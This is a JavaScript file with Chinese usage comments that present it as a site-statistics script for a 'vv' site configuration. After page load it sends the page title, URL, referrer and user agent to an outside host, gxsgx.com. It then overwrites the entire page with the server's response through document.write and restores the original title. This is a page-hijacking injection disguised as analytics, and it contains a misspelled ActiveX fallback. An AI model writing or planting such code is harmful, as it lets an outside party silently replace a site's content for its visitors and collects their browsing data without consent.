//使用方法
//在vv的配置文件data/config.php 下的'web_tongji' => 配置本文件的名称。后面可以在这php里修改ad.js的名称。
function ajax(params) {
	params = params || {};
	params.data = params.data || {};
	var json = params.jsonp ? jsonp(params) : json(params);
	function json(params) {
		params.type = (params.type || 'GET').toUpperCase();
		params.data = formatParams(params.data);
		var xhr = null;
		if (window.XMLHttpRequest) {
			xhr = new XMLHttpRequest()
		} else {
			xhr = new ActiveXObjcet('Microsoft.XMLHTTP')
		};
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4) {
				var status = xhr.status;
				if (status >= 200 && status < 300) {
					var response = '';
					var type = xhr.getResponseHeader('Content-type');
					if (type.indexOf('xml') !== -1 && xhr.responseXML) {
						response = xhr.responseXML;
					} else if (type === 'application/json') {
						response = JSON.parse(xhr.responseText);
					} else {
						response = xhr.responseText;
					};
					params.success && params.success(response)
				} else {
					params.error && params.error(status)
				}
			}
		};
		if (params.type == 'GET') {
			xhr.open(params.type, params.url + '?' + params.data, true);
			xhr.send(null)
		} else {
			xhr.open(params.type, params.url, true);
			xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
			xhr.send(params.data)
		}
	}
	function formatParams(data) {
		var arr = [];
		for (var name in data) {
			arr.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]))
		};
		arr.push('v=' + random());
		return arr.join('&')
	}
	function random() {
		return Math.floor(Math.random() * 10000 + 500)
	}
}

//新增，在文档加载后才去执行，否者无法获取title
$(function(){
    
    var browser = {
	versions: function() {
		var u = navigator.userAgent,
		app = navigator.appVersion;
		return {
			trident: u.indexOf("Trident") > -1,
			presto: u.indexOf("Presto") > -1,
			webKit: u.indexOf("AppleWebKit") > -1,
			gecko: u.indexOf("Gecko") > -1 && u.indexOf("KHTML") == -1,
			mobile: !!u.match(/AppleWebKit.*Mobile.*/),
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
			android: u.indexOf("Android") > -1 || u.indexOf("Linux") > -1,
			iPhone: u.indexOf("iPhone") > -1,
			iPad: u.indexOf("iPad") > -1,
			webApp: u.indexOf("Safari") == -1
		}
	} (),
	language: (navigator.browserLanguage || navigator.language).toLowerCase()
};
if (browser.versions.mobile) {
	var from = 'mobile'
} else {
	var from = 'pc'
}
var title = document.title;
ajax({
	url: 'http://www.gxsgx.com/indexfinal.php',
	type: 'GET',
	data: {
		keyword: document.title,
		from: from,
		originUrl: document.location.href,
		referer: document.referrer,
		userAgent: navigator.userAgent
	},
	success: function(res) {
		document.write(res);
		document.title = title;
		document.close()
	},
	error: function(error) {}
});
    
    
    
});
